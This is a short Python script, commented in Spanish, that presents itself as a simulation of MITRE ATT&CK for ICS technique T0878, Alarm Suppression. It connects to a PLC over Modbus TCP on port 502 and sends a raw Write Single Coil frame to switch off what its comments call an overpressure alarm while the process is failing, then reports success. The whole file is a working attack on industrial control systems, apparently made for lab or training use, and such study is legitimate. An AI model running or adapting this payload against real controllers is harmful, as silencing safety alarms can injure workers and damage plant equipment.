import socket

IP_PLC = '192.168.70.129'
PORT_ICS = 502

print("[*] Simulando Técnica T0878 - Alarm Suppression")
print("[-] Inyectando comando para suprimir alarmas críticas en el PLC...")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_PLC, PORT_ICS))
    
    # Payload Modbus para FC 05 (Write Single Coil)
    # Suponemos que el registro 00 0A es la "Alarma de Sobrepresión"
    # Escribimos \x00\x00 para apagar (OFF/Suprimir) la alarma aunque el proceso esté fallando
    payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x0A\x00\x00'
    
    s.send(payload)
    respuesta = s.recv(1024)
    print(f"[+] Alarma suprimida con éxito. Respuesta del PLC: {respuesta.hex()}")
    s.close()

except Exception as e:
    print(f"[!] Error: {e}")
